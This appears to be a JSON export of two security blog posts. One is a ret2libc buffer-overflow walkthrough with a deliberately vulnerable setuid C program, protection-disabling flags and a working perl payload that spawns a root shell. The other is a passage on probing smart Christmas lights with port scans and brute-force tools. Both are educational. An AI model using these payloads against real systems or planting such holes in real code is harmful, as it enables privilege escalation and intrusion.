\"\\x40\\xc5\\xe2\\xf7\" . \"\\xde\\xc0\\xad\\xde\" . \"\\x3e\\x52\\xf5\\xf7\"')\n    @sh-4.4# whoami\n    root\n    @sh-4.4# exit\n    exit\n    [1]    9121 segmentation fault  bin/sof \n    \n\nWe successfully overflow the buffer, call system with '/bin/sh' as the first arg, and get a shell. This works even despite the fact that when we exit from the shell, we get a segmentation fault. There is a way to exit the shell cleanly without triggering a segfault. What we can do instead of using 0xdeadbeef for our return address is use the `exit` system call address instead. Doing so should give us a clean exit.\n\n    @gefâ¤  p exit\n    $2 = {<text variable, no debug info>} 0xf7e1e8f0 <__GI_exit>\n    \n    @gefâ¤  q\n    \n\nReverse exit's address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    â  raddr -a 0xf7e1e8f0 \n    \\xf0\\xe8\\xe1\\xf7\n    \n\nAnd now replace the invalid return address with it in our payload.\n\n    #\n    # [      260 x \"A\" characters      ][  system() address  ][ exit() address ][ '/bin/sh' address ]\n    #\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xf0\\xe8\\xe1\\xf7\" . \"\\x3e\\x52\\xf5\\xf7\"')\n    @sh-4.4# whoami\n    root\n    @sh-4.4# exit\n    exit\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â\n    \n\nAnd get a shell with a clean exit.\n\n## Brief overview of a few common buffer overflow protection mechanisms\n\n- \nASLR (Address Space Layout Randomization)\n\n- ASLR is a technique used to randomize the address space of programs when they start. This is done by giving program a random start address. This makes exploiting a buffer overflow more difficult because the addresses in the program become unreliable thus making it harder to consistently jump to any given address. Just like any other security mechanisms, ASLR only makes things more difficult. Not impossible.\n\n- \nCanary\n\n- Stack Canaries are used to catch stack overflows before malicious code is executed. These work by modifying function epilog and prologue regions on the stack. If a buffer is overwritten during execution, it's noticed, and results in an exception (hopefully) which bubbles up until it is caught by an exception handler. This is not always successful and there are methods for exploiting this. If you can successfully overwrite the exception handler on the stack (SEH), you can carry out your exploit, completely mitigating canaries.\n\n- \nRELRO (RELocation Read-Only)\n\n- RELRO protection makes the relocation sections that are used to resolve dynamically loaded functions, read-only. Essentially, what this means is that binaries get marked which tells the dynamic linker to resolve all symbols during the start up of a program when it's executed or when a shared library is linked to using dlopen instead of waiting to do resolution when a function is called.\n\n- \nNX bit (Non-executable bit)\n\n- Used to mark certain areas of memory as non-executable. Any processors that support the use of the NX bit will refuse to perform any write operations on marked segments of memory.\n\n- AMD uses the terminology \"Enhanced Virus Protection\" for the NX bit.\n- Intel refers to it as the \"XD (eXecute Disabled) bit.\"\n- ARM refers to it as the \"XN (eXecute Never) bit.\"\n\n## Further Reading\n\n- [BOF protection](https://en.wikipedia.org/wiki/Buffer_overflow_protection)\n- [Understanding Buffer Overflow Attacks](https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/)\n- [Stack - Abstract Data Type](https://en.wikipedia.org/wiki/Stack_(abstract_data_type))\n- [Smashing The Stack For Fun And Profit](http://insecure.org/stf/smashstack.html)\n- [0x00 sec](https://0x00sec.org/search?q=stack%20overflow)\n- [Black Hat - Difference between BOF preventions and weaknesses](https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-silberman/bh-us-04-silberman-paper.pdf)\n- [Exploit Mitigation Techniques - DEP](https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634)\n- [Shellblade ret2libc](http://shellblade.net/docs/ret2libc.pdf)\n- [x64 ROP](https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937)\n- [UAF heap overflow](https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580)\n- [NOP sled](https://www.exploit-db.com/papers/13171/)\n\n## Tools\n\n- [GEF - GDB Enhanced Features](https://github.com/hugsy/gef/)\n- [SMAP - Shellcode Mapper](https://github.com/rootlabs/smap/)\n- [Radare2](https://github.com/radare/radare2/)\n- [Cutter - Radare2 QT GUI](https://github.com/radareorg/cutter)\n- [MSFvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)\n- [pwntools](https://github.com/Gallopsled/pwntools)\n- [Unicorn - CPU emulator](http://www.unicorn-engine.org/)\n\n## Cheatsheets\n\n- [Memory Segmentation](https://i.imgur.com/Xe1m6C3.png)\n- [Reverse Engineering](https://i.imgur.com/ewrWkEa.png)\n- [radare2](https://github.com/radare/radare2/blob/master/doc/intro.md)\n\n## Other\n\n- [Shellcode Database](http://shell-storm.org/shellcode/)\n- [GDB documentation](https://sourceware.org/gdb/current/onlinedocs/gdb/)\n- [GEF documentation](http://gef.readthedocs.io/en/master/)\n- [Linux 32bit syscalls](http://asm.sourceforge.net/syscall.html)\n","cover":"2019/01/gef.jpg","author":{"name":"th3v0id","avatar":"avatars/th3v0id.jpg"},"content":"\nA stack buffer overflow occurs when a program writes to a memory address on it's call stack outside of the intended structure / space.\n\nIn this walk-through, I'm going to cover the ret2libc (return-to-libc) method. This method of exploitation is great because it doesn't require the use of your typical shellcode. It involves making sys calls to the functions provided to us by libc (standard c library). We're going to use the `system` and `exit` sys calls for demonstration.\n\nTo have a good understanding about how stack overflows work, it's extremely helpful to know how stack data structures work, and more importantly - how the call stack works. For the sake of time, I'm not going to type out how these two things work in great detail. If you want to know how these work, I would recommend watching [stack](https://www.youtube.com/watch?v=7dLZRMDcY6c) and [call stack](https://www.youtube.com/watch?v=XbZQ-EonR_I).\n\n## Creating a vulnerable binary to test on\n\nTo practice carrying out a SOF, we create a vulnerable binary. The source below uses strcpy with no boundary checking. This is what makes the code vulnerable to a stack overflow attack. strcpy() will take whatever is in argv[1] and copy it into buf. Without boundary checking around strcpy() to make sure the length of argv[1] isn't greater than the width of the buffer, we can overrun the buffer and overwrite assembler instructions with our own.\n\n    #include <string.h>\n    #include <unistd.h>\n    #include <sys/cdefs.h>\n    \n    int main(int argc, char** argv) {\n    \n        setuid(0);\n    \n        if (argc > 1) {\n            char buf[256];\n            strcpy(buf, argv[1]);\n        }\n    \n        return 0;\n    }\n    \n\nFor the sake of simplicity and keeping this article to a sane length, I disable common buffer overflow protection (BOP) mechanisms including ASLR, Canaries, and NX bit. PIE and RelRO are disabled on my system by default. I also pass an option along to make the binary 32-bit.\n\n`gcc -g -Wall -mpreferred-stack-boundary=2 -fno-stack-protector -m32 -I. -z execstack -o bin/sof src/sof.c`\n\n- `-g`: Produces debugging information about the program that GDB (GNU Debugger) can use to aid us.\n- `-fno-stack-protector`: Disables stack smashing protectors (SSP).\n- `-z execstack`: Makes stack frames executable.\n- `-o sof`: Output (compiled) binary name will be sof.\n- `-mpreferred-stack-boundary=2`: aligns the stack boundary in our binary to 4 bytes.\n\nASLR can't be disabled via a compiler flag because it's a feature that's carried out and managed by the kernel. On Fedora, Debian, and Ubuntu, ASLR can be disabled by adding `kernel.randomize_va_space = 0` to `/etc/sysctl.conf` or `echo 0 > /proc/sys/kernel/randomize_va_space`. Other linux distributions may require a different approach. An easy way to determine if ASLR is enabled (it likely is if you didn't expliclity disable it) is to `cat /proc/sys/kernel/randomize_va_space`. If the output is a positive number, it's enabled.\n\n## Assembler dump breakdown\n\nLet's disassemble the main function in our binary, break it down, and talk about what happens at an assembler level.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    â  gdb -q \tbin/sof                                              \n    [*] No debugging session active\n    GEF for linux ready, type `gef' to start, `gef config' to configure\n    67 commands loaded for GDB Fedora 8.0.1-33.fc27 using Python engine 3.6\n    Reading symbols from bin/sof...done.\n    @gefâ¤  disassemble main\n    Dump of assembler code for function main:\n       0x08048416 <+0>:\tpush   ebp\n       0x08048417 <+1>:\tmov    ebp,esp\n       0x08048419 <+3>:\tsub    esp,0x100\n       0x0804841f <+9>:\tpush   0x0\n       0x08048421 <+11>:\tcall   0x8048300 <setuid@plt>\n       0x08048426 <+16>:\tadd    esp,0x4\n       0x08048429 <+19>:\tcmp    DWORD PTR [ebp+0x8],0x1\n       0x0804842d <+23>:\tjle    0x8048447 <main+49>\n       0x0804842f <+25>:\tmov    eax,DWORD PTR [ebp+0xc]\n       0x08048432 <+28>:\tadd    eax,0x4\n       0x08048435 <+31>:\tmov    eax,DWORD PTR [eax]\n       0x08048437 <+33>:\tpush   eax\n       0x08048438 <+34>:\tlea    eax,[ebp-0x100]\n       0x0804843e <+40>:\tpush   eax\n       0x0804843f <+41>:\tcall   0x80482e0 <strcpy@plt>\n       0x08048444 <+46>:\tadd    esp,0x8\n       0x08048447 <+49>:\tmov    eax,0x0\n       0x0804844c <+54>:\tleave  \n       0x0804844d <+55>:\tret    \n    End of assembler dump.\n    @gefâ¤  q\n    \n\n       0x08048416 <+0>:\tpush   ebp\n       0x08048417 <+1>:\tmov    ebp,esp\n       0x08048419 <+3>:\tsub    esp,0x100\n    \n\nThese first few lines above are called a function prologue. `push ebp` pushes our base pointer onto the stack. Then `mov ebp,esp` copies the value of `esp` (stack pointer) into the `ebp` register making `ebp` == `esp`. Next, `sub esp,0x100` moves the stack pointer 256 bytes (0x100 hex = 256) towards a lower memory address, reserving 256 bytes of data on the stack. This is space being reserved for `char buf[256]`.\n\n       0x0804841f <+9>:\tpush   0x0\n       0x08048421 <+11>:\tcall   0x8048300 <setuid@plt>\n    \n\nPush 0 onto the stack as an argument for the call to `setuid()`.\n\n       0x08048426 <+16>:\tadd    esp,0x4\n       0x08048429 <+19>:\tcmp    DWORD PTR [ebp+0x8],0x1\n       0x0804842d <+23>:\tjle    0x8048447 <main+49>\n    \n\nThe next instruction `cmp DWORD PTR [ebp+0x8],0x1` compares the first argument of main (argc) to 1. The following `jle` instruction uses the result of this comparison. It takes the result and jumps to `<main+39>` if the result is less than or equal to the value stored at `0x8048412`, which is 1. If you look at the C source above, you can see this is essentially our `if (argc >) {...}` condition.\n\n       0x0804842f <+25>:\tmov    eax,DWORD PTR [ebp+0xc]\n       0x08048432 <+28>:\tadd    eax,0x4\n       0x08048435 <+31>:\tmov    eax,DWORD PTR [eax]\n       0x08048437 <+33>:\tpush   eax\n    \n\nHere, we move the address stored at ebp+0xc into the eax register (this is the address to element 0 of argv). Then, we add 4 bytes to the address stored in the eax register. This results in the address of `argv[1]`. Next, `mov eax,DWORD PTR [eax]` takes the value at `argv[1]` and copies it into the `eax` register. `push eax` pushes this value onto the stack.\n\n       0x08048438 <+34>:\tlea    eax,[ebp-0x100]\n       0x0804843e <+40>:\tpush   eax\n    \n\n`lea eax,[ebp-0x100]` calculates the address of `ebp-0x100` and stores the address in `eax`. `push eax` pushes this address onto the stack.\n\n       0x0804843f <+41>:\tcall   0x80482e0 <strcpy@plt>\n    \n\nThe `call` instruction does a couple of things. It pushes the address of the instruction immediately following the call instruction onto the stack and then does an unconditional jump to `strcpy@plt`. The reason a return address is pushed onto the stack is so that when `strcpy@plt` finishes executing, the program knows where to return execution.\n\n       0x08048444 <+46>:\tadd    esp,0x8\n       0x08048447 <+49>:\tmov    eax,0x0\n       0x0804844c <+54>:\tleave  \n       0x0804844d <+55>:\tret    \n    \n\nThese last four instructions are a function epilog. This is just the opposite of a function prologue. Instead of setting up the stack, the epilog cleans up the stack. `add esp,0x8` adds 8 bytes to the address `esp` points to. Then `mov eax,0x0` zeros out whatever is stored in the `eax` register. The `leave` instruction does a couple of things. It releases the stack frame and then copies the base pointer (`ebp`) into `esp`. This releases the space that was allocated to the previous stack frame. Finally, the `ret` instruction pops the return address off the stack and transfers returns execution to the address that was pop'd.\n\n# Exploiting the SOF vulnerability\n\nNow that we have disabled common BOP features and understand the assembler of our vulnerable binary, we will begin exploiting. One of the first things I like to do (after reviewing the assembler dump) is to verify that an overflow exists by triggering a segmentation fault. This is done by providing data to a program which in our case, get's strcpy'd into a fixed width buffer.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    â  bin/sof $(perl -e 'print \"A\" x 260')\n    [1]    6406 segmentation fault (core dumped)  bin/sof $(perl -e 'print \"A\" x 260')\n    \n\nWhen we strcpy 260 'A' characters into the buffer, we get a segmentation fault. This is because we overwrote the four bytes of memory after the end of our buffer. Segmentation faults are exceptions that get raised by hardware with memory protection. It indicates that something tried writing to a region of memory it shouldn't have.\n\n## Creating the payload\n\nIn order to successfully call `system`, we need to place a few different values on the stack, when we overflow the buffer. We need the address of \"/bin/sh\" found in libc.so, an address that execution will return to when system has finished, and an address to the system call itself.\n\nTo get the address to '/bin/sh', we can calculate it by taking the starting address of libc.so and adding the offset of '/bin/sh' to it.\n\nTo see the absolute path to the libc.so library that our binary uses, we use `ldd`. This is needed for the next step.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  ldd bin/sof\n    \tlinux-gate.so.1 (0xf7fd2000)\n    \tlibc.so.6 => /lib/libc.so.6 (0xf7deb000)\n    \t/lib/ld-linux.so.2 (0xf7fd4000)\n    \n    \n\nNext, we use `strings` to report the offset of any string it finds in libc.so and grep the output for what we're after.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  strings -a -t x /lib/libc.so.6 | grep '/bin/sh'   \n     16a23e /bin/sh\n    \n\nRunning `vmmap` will also provide the starting address of libc.so when ran from a active gdb session.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    â  gdb -q bin/sof\n    \n    @gefâ¤  vmmap\n    Start      End        Offset     Perm Path\n    0x08048000 0x08049000 0x00000000 r-x /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n    0x08049000 0x0804a000 0x00000000 rwx /home/th3v0id/repos/bufferoverflows/stack/01/bin/sof\n    0xf7deb000 0xf7fa4000 0x00000000 r-x /usr/lib/libc-2.26.so\n    0xf7fa4000 0xf7fa5000 0x001b9000 --- /usr/lib/libc-2.26.so\n    0xf7fa5000 0xf7fa7000 0x001b9000 r-x /usr/lib/libc-2.26.so\n    0xf7fa7000 0xf7fa8000 0x001bb000 rwx /usr/lib/libc-2.26.so\n    0xf7fa8000 0xf7fab000 0x00000000 rwx \n    0xf7fcd000 0xf7fcf000 0x00000000 rwx \n    0xf7fcf000 0xf7fd2000 0x00000000 r-- [vvar]\n    0xf7fd2000 0xf7fd4000 0x00000000 r-x [vdso]\n    0xf7fd4000 0xf7ffc000 0x00000000 r-x /usr/lib/ld-2.26.so\n    0xf7ffc000 0xf7ffd000 0x00027000 r-x /usr/lib/ld-2.26.so\n    0xf7ffd000 0xf7ffe000 0x00028000 rwx /usr/lib/ld-2.26.so\n    0xfffda000 0xffffe000 0x00000000 rwx [stack]\n    \n    @gefâ¤  q\n    \n\nWe calculate the address by taking the start address of `/usr/lib/libc-2.26.so` and add the offset of the string. I like to use `printf` for this. If you use printf in gdb, you have to add `shell` before the command so gdb doesn't try to interpret it as one it provides. Same applies to any shell command you want to run in gdb.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  printf \"0x%x\\n\" $((0xf7deb000 + 0x16a23e))  \n    0xf7f5523e\n    \n\nTo verify the address is correct, we can evaluate it in gdb, and see what string resides there. It should be '/bin/sh'.\n\n    @gefâ¤  x/s 0xf7f5523e\n    0xf7f5523e:\t\"/bin/sh\"\n    \n\nAnd now, we just need the address of `system`.\n\n    @gefâ¤  p system\n    $1 = {<text variable, no debug info>} 0xf7e2c540 <__libc_system>\n    \n    @gefâ¤  q\n    \n\nBecause I'm on a machine with an Intel processor and I compiled the binary for 32 bit systems, the addresses we found need to be reversed to conform with little-endian notation. If you have a processor that enforces little-endian notation, you will find yourself doing this often. I wrote this [script](https://gist.github.com/selftaught/5ba8e942f68ae38719243de8d07bcaea) that takes a memory address and reverses it.\n\nReverse system address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  raddr -a 0xf7e2c540\n    \\x40\\xc5\\xe2\\xf7\n    \n\nReverse \"/bin/sh\" string address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  raddr -a 0xf7f5523e\n    \\x3e\\x52\\xf5\\xf7\n    \n\nAnd for the return address, we can use anything for the time being.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    â   raddr -a 0xdeadc0de\n    \\xde\\xc0\\xad\\xd\n    \n\nWe modify the command we ran earlier, adding the reversed addresses onto the end of the payload.\n\n    #\n    # [      260 x \"A\" characters      ][  system() address  ][ random address ][ '/bin/sh' address ]\n    #\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xde\\xc0\\xad\\xde\" . \"\\x3e\\x52\\xf5\\xf7\"')\n    @sh-4.4# whoami\n    root\n    @sh-4.4# exit\n    exit\n    [1]    9121 segmentation fault  bin/sof \n    \n\nWe successfully overflow the buffer, call system with '/bin/sh' as the first arg, and get a shell. This works even despite the fact that when we exit from the shell, we get a segmentation fault. There is a way to exit the shell cleanly without triggering a segfault. What we can do instead of using 0xdeadbeef for our return address is use the `exit` system call address instead. Doing so should give us a clean exit.\n\n    @gefâ¤  p exit\n    $2 = {<text variable, no debug info>} 0xf7e1e8f0 <__GI_exit>\n    \n    @gefâ¤  q\n    \n\nReverse exit's address\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    â  raddr -a 0xf7e1e8f0 \n    \\xf0\\xe8\\xe1\\xf7\n    \n\nAnd now replace the invalid return address with it in our payload.\n\n    #\n    # [      260 x \"A\" characters      ][  system() address  ][ exit() address ][ '/bin/sh' address ]\n    #\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â  bin/sof $(perl -e 'print \"A\" x 260 . \"\\x40\\xc5\\xe2\\xf7\" . \"\\xf0\\xe8\\xe1\\xf7\" . \"\\x3e\\x52\\xf5\\xf7\"')\n    @sh-4.4# whoami\n    root\n    @sh-4.4# exit\n    exit\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master\n    â\n    \n\nAnd get a shell with a clean exit.\n\n## Brief overview of a few common buffer overflow protection mechanisms\n\n- \nASLR (Address Space Layout Randomization)\n\n- ASLR is a technique used to randomize the address space of programs when they start. This is done by giving program a random start address. This makes exploiting a buffer overflow more difficult because the addresses in the program become unreliable thus making it harder to consistently jump to any given address. Just like any other security mechanisms, ASLR only makes things more difficult. Not impossible.\n\n- \nCanary\n\n- Stack Canaries are used to catch stack overflows before malicious code is executed. These work by modifying function epilog and prologue regions on the stack. If a buffer is overwritten during execution, it's noticed, and results in an exception (hopefully) which bubbles up until it is caught by an exception handler. This is not always successful and there are methods for exploiting this. If you can successfully overwrite the exception handler on the stack (SEH), you can carry out your exploit, completely mitigating canaries.\n\n- \nRELRO (RELocation Read-Only)\n\n- RELRO protection makes the relocation sections that are used to resolve dynamically loaded functions, read-only. Essentially, what this means is that binaries get marked which tells the dynamic linker to resolve all symbols during the start up of a program when it's executed or when a shared library is linked to using dlopen instead of waiting to do resolution when a function is called.\n\n- \nNX bit (Non-executable bit)\n\n- Used to mark certain areas of memory as non-executable. Any processors that support the use of the NX bit will refuse to perform any write operations on marked segments of memory.\n\n- AMD uses the terminology \"Enhanced Virus Protection\" for the NX bit.\n- Intel refers to it as the \"XD (eXecute Disabled) bit.\"\n- ARM refers to it as the \"XN (eXecute Never) bit.\"\n\n## Further Reading\n\n- [BOF protection](https://en.wikipedia.org/wiki/Buffer_overflow_protection)\n- [Understanding Buffer Overflow Attacks](https://itandsecuritystuffs.wordpress.com/2014/03/18/understanding-buffer-overflows-attacks-part-1/)\n- [Stack - Abstract Data Type](https://en.wikipedia.org/wiki/Stack_(abstract_data_type))\n- [Smashing The Stack For Fun And Profit](http://insecure.org/stf/smashstack.html)\n- [0x00 sec](https://0x00sec.org/search?q=stack%20overflow)\n- [Black Hat - Difference between BOF preventions and weaknesses](https://www.blackhat.com/presentations/bh-usa-04/bh-us-04-silberman/bh-us-04-silberman-paper.pdf)\n- [Exploit Mitigation Techniques - DEP](https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634)\n- [Shellblade ret2libc](http://shellblade.net/docs/ret2libc.pdf)\n- [x64 ROP](https://0x00sec.org/t/64-bit-rop-you-rule-em-all/1937)\n- [UAF heap overflow](https://0x00sec.org/t/heap-exploitation-abusing-use-after-free/3580)\n- [NOP sled](https://www.exploit-db.com/papers/13171/)\n\n## Tools\n\n- [GEF - GDB Enhanced Features](https://github.com/hugsy/gef/)\n- [SMAP - Shellcode Mapper](https://github.com/rootlabs/smap/)\n- [Radare2](https://github.com/radare/radare2/)\n- [Cutter - Radare2 QT GUI](https://github.com/radareorg/cutter)\n- [MSFvenom](https://www.offensive-security.com/metasploit-unleashed/msfvenom/)\n- [pwntools](https://github.com/Gallopsled/pwntools)\n- [Unicorn - CPU emulator](http://www.unicorn-engine.org/)\n\n## Cheatsheets\n\n- [Memory Segmentation](https://i.imgur.com/Xe1m6C3.png)\n- [Reverse Engineering](https://i.imgur.com/ewrWkEa.png)\n- [radare2](https://github.com/radare/radare2/blob/master/doc/intro.md)\n\n## Other\n\n- [Shellcode Database](http://shell-storm.org/shellcode/)\n- [GDB documentation](https://sourceware.org/gdb/current/onlinedocs/gdb/)\n- [GEF documentation](http://gef.readthedocs.io/en/master/)\n- [Linux 32bit syscalls](http://asm.sourceforge.net/syscall.html)\n"},{"title":"i didn't hack my christmas tree lights","slug":"didnt-hack-my-christmas-lights","date_published":1545882584000,"date_updated":1545882612000,"tags":[],"excerpt":"\nSometimes you go to Target and fall in love with the most stupid and useless yet incredibly cool product you could buy with the spare $100 you don't really have and sometimes you are even lucky enough to find a product that:\n\n1. lights up\n2. is connected to the internet\n\nwhich personally are my two favorite things. Oh, and it's Christmastime?? Enter the Philips Illuminate Starter Kit of 25 C9-sized LED lights. \n\nWhile many wi-fi app controlled LED lights come in LED light strip form, these lights in particular come attached to each other on a typical Christmas light string setup, but at the end of the cord about a foot from the plug is a green control box. 25 lights isn't really enough to make a standard Christmas tree look good, so I bought some supplemental lights and hooked these babies up then got them connected to my wifi ASAP. You can buy additional Philips Illuminate branded extension light strings to hook up to your main strand, which maxes out at 300 lights per control box.\n\n![](2018/12/IMG_3415.jpg \"a mix of birbs, the colored Philips lights, and a strand of normal lights. note the green control box to the bottom left\")\n\nIn order to connect to your Philips Illuminate lights, you download the Illuminate app, connect to the wifi the control box emanates, and provide the control box with the login to your home wifi. Once you hook the control box up to your home wifi, everything is all set for app control. The app can do A Bunch of Cool Things, including a huge amount of pre-programmed light patterns, the ability to make your own custom patterns, and a mode where the lights react to your voice... super creepy but great for the cool trick factor. \n\nThe ease of this all means the lights are absolutely worth the sale price of $79.99 (originally $99.99!), right? But it'd be nice to get them to do a little more, or at least be able to deconstruct how they work. After running through the programs available on the app, creating my own programs on the app, and poking around to see if anybody had created a custom firmware for these yet, I got to the point where I started getting a bit more curious about the security of the Philips Illuminate light set. \n\nFirst of all, if these things are on my wifi network, they've got to have an IP address and my particular starting point for poking at things on my network is to do an nmap scan:\n\n![](2018/12/image-19.jpg)\n\nChoose whatever nmap scan you want, but this one hits all the ports tcp and udp so you can get a general idea of what the network functions of this device are. From this scan, I've got the easily recognizable port 80 which indicates we can browse to http://192.168.50.37 on my home network and see what's up there. I also see a pretty neat option with port 5577, which led me down a huge rabbit hole. I've never messed with smart home devices before, but apparently port 5577 is a standard control port for issuing commands to networked LED devices with a certain set of controllers. In the UDP zone, there's port 53!! Is this thing running a DNS server? There's also those various high level UDP ports which could offer up some interesting information.\n\nIn the interest of keeping things simple, I started with the port 80 web interface. By browsing to the IP address, I got a login prompt where I tried every different formulation of admin/admin, admin/password, root/[blank]... nothing.\n\n![](2018/12/Screen-Shot-2018-12-26-at-10.24.57-AM.jpg \"a challenge\")\n\nAlso note the truly beautiful shade of pink you get upon failed login... the kind of pink that makes you want to attempt more.\n\n![](2018/12/Screen-Shot-2018-12-26-at-10.29.47-AM.jpg \"heck.\")\n\nAt this point I was pretty okay with trying anything I could to get into what I assumed was a web interface to change settings with the lights. Following t[his](https://support.portswigger.net/customer/portal/articles/1964020-using-burp-to-brute-force-a-login-page) article about using Burp to brute force a login page yielded no results. [This](http://tylerrockwell.github.io/defeating-basic-auth-with-hydra/) article about using Hydra to brute force a login page... **also** yielded no results. Double heck! \n\n***NOTE:*** Both of the brute force options would have worked if I had a certain reversed common username in any of the wordlists I used... remember to use good wordlists, pals. But I didn't, so I carried on.\n\nThe next thing I wanted to try was getting a PCAP of the app issuing commands to the lights, because maybe the password would be visible over the wire! At this point I was mistakenly assuming that the app was issuing API calls over port 80 via authenticated HTTP at the very least. I didn't have an easy way right off the bat to grab a PCAP, so I turned to asking people around me what they'd do next. We ended up decompiling the Philips Illuminate APK to try and find the password. It was a really great way to get a crash course in Android app development, but didn't yield any results HTTP login password-wise. I did get a bit more information about these lights though: the original developer is a company called Zengge and also got some model information from examining the APK. I wasn't right about the HTTP posts for the control of the lights, so on to the next option.\n\nDoing more research about port 5577 gave me the confirmation that it was time to put these things on an isolated test network just to be able to make sure nothing else was messing with them and snatch a pcap of opening my app and issuing a series of on-off commands:\n\n![](2018/12/Screen-Shot-2018-12-25-at-4.13.02-PM.jpg \"things happening over port 5577!!\")\n\nand look! Confirmation that commands are indeed issued over port 5577. But how can you confirm for absolutely certain that it's not just random chatter? Follow the streams:\n\n![](2018/12/Screen-Shot-2018-12-25-at-4.26.26-PM.jpg \"Repetitive commands being issued! Hooray!\")\n \nThat's what a series of on-off commands looks like, and here's what a series of switching between the two custom programs I made on the app look like: \n\n![](2018/12/Screen-Shot-2018-12-25-at-4.36.31-PM.png \"a bit more complex\")\n\nSo as you can see, a bit more complicated when you get into the fancy settings like color changes and fade speeds. When looking through the pcaps for different kinds of requests, there's not a whole bunch more information beyond the promise of the ability to issue totally unauthenticated commands. This makes it unnecessary to have the HTTP page login for the purposes of controlling the lights without the app, but I was still really interested in finding the password. What was that terrible pink 404 error hiding?\n\nOur next port to explore was confirmed as the one interesting artifact I found in the PCAPs I took: this controller randomly spits out the either the ip address, hostname, mac address in a string or every so often a string of \"HF-A11ASSISTHREAD\" over UDP on port 48899. \n\n![](2018/12/Screen-Shot-2018-12-26-at-1.46.48-PM.png \"a friendly network device\")\n\nThis didn't correspond with any hostnames, so I immediately threw it into Google and found out some excellent information about the Zengge Lightbulb manufacturing company thanks to [vikstrous on Github](https://github.com/vikstrous/zengge-lightcontrol). This source not only gave me some insight onto what's going on with this magical box and lights, but also the admin/password to login to the web interface (finally)!\n\nWhat is going on here anyways? What we know at this point is that there's 25 LEDs controlled by a control box. The control box has a wifi card in it which has the ability to not only broadcast but also connect to a wifi network. This card also runs a UART (Universal Asynchronous Receiver/Transmitter) that accepts commands over port 5577. The mysterious port 48899 is the ability to control some options for the device, but lucky for me the default HTTP login found on the internet for the device works!\n\n![](2018/12/Screen-Shot-2018-12-25-at-5.37.14-PM.jpg \"Answers!\")\n\nHere is where we can configure some cool information about the device's settings for sending and receiving commands, but honestly I'm not even going to touch it â since what I was really hoping for was a web interface to control the lights themselves, not really the device that controls communication to them. \n\nAn additional part of this adventure that doesn't really fit into the rest of the research is that Philips is just the distributor for this product which is made by Seasonal Specialties, a company founded in 1996. [Seasonal Specialities](http://www.seasonalspecialties.com) has a website that was created in Microsoft Frontpage 5.0 but also a [wordpress with a default login page](http://www.seasonalspecialties.com/wp/wp-login.php) operating on the same web host. Yikes. These details tell me security isn't exactly a major concern at Seasonal Specialities, yet these lights are a really nicely made product so I would like to tell them to please start caring! If you go through all of the trouble to rebrand the Zenegge light parts into something that becomes a well-constructed nicely working set of Christmas lights, why not go the extra mile and figure out how to cover up their lack of security? \n\nLuckily, I've got what I need to start creating the foundation for controlling the lights without the Philips Illuminate app. I have a model of UART Controller and lights, I know that the commands aren't sent with any authentication, and I could conceivably find a way to send commands via my Raspberry Pi or create my own web interface for their control. Simply telnetting to port 5577 and repeating the same strings observed in the PCAP back at the device doesn't really work... So now it's just a matter of finding out what packages are out there to interact with this controller or building my own. I'm also tempted to see if any of the [OpenHab](https://www.openhab.org/addons/bindings/wifiled/) extensions can play nice with these lights. Either way, I haven't really hacked my Christmas lights, I just found out a TON of information about how they work and function. The true hack will come when I find a way to make them work without their intended supporting software. \n\nThanks to some sources:\n\n[https://www.jpelectron.com/sample/Electronics/WiFi%20LED%20control/](https://www.jpelectron.com/sample/Electronics/WiFi%20LED%20control/)\n\n[https://github.com/renebohne/wifirgbcontroller](https://github.com/renebohne/wifirgbcontroller)\n\n[https://www.openhab.org/addons/bindings/wifiled/](https://www.openhab.org/addons/bindings/wifiled/)\n\n[https://github.com/vikstrous/zengge-lightcontrol](https://github.com/vikstrous/zengge-lightcontrol)\n","cover":"2018/12/A7B65125-AF02-44C0-8FBF-0D2D0236161F-1.jpg","author":{"name":"kimb3r","avatar":"avatars/kimb3r.jpg"},"content":"\nSometimes you go to Target and fall in love with the most stupid and useless yet incredibly cool product you could buy with the spare $100 you don't really have and sometimes you are even lucky enough to find a product that:\n\n1. lights up\n2. is connected to the internet\n\nwhich personally are my two favorite things. Oh, and it's Christmastime?? Enter the Philips Illuminate Starter Kit of 25 C9-sized LED lights. \n\nWhile many wi-fi app controlled LED lights come in LED light strip form, these lights in particular come attached to each other on a typical Christmas light string setup, but at the end of the cord about a foot from the plug is a green control box. 25 lights isn't really enough to make a standard Christmas tree look good, so I bought some supplemental lights and hooked these babies up then got them connected to my wifi ASAP. You can buy additional Philips Illuminate branded extension light strings to hook up to your main strand, which maxes out at 300 lights per control box.\n\n![](2018/12/IMG_3415.jpg \"a mix of birbs, the colored Philips lights, and a strand of normal lights. note the green control box to the bottom left\")\n\nIn order to connect to your Philips Illuminate lights, you download the Illuminate app, connect to the wifi the control box emanates, 